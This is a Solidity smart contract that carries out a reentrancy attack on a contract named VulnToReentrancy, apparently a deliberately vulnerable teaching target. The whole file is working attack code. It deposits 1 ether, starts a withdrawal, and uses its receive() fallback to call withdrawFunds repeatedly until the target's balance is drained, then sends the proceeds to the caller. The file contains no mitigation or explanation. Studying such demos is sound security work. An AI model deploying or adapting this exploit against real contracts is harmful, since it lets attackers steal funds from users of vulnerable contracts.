// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./VulnToReentrancy.sol";

contract ReentrancyAttack {
    VulnToReentrancy public vulnToReentrancy;

    constructor(address _address) {
        vulnToReentrancy = VulnToReentrancy(_address);
    }

    function attackContract() public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        vulnToReentrancy.depositFunds{value: 1 ether}();
        // Start of attack
        vulnToReentrancy.withdrawFunds(1 ether);
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // fallback function - allows the attack
    receive() external payable {
        if (address(vulnToReentrancy).balance > 1 ether) {
            vulnToReentrancy.withdrawFunds(1 ether);
        }
    }
}
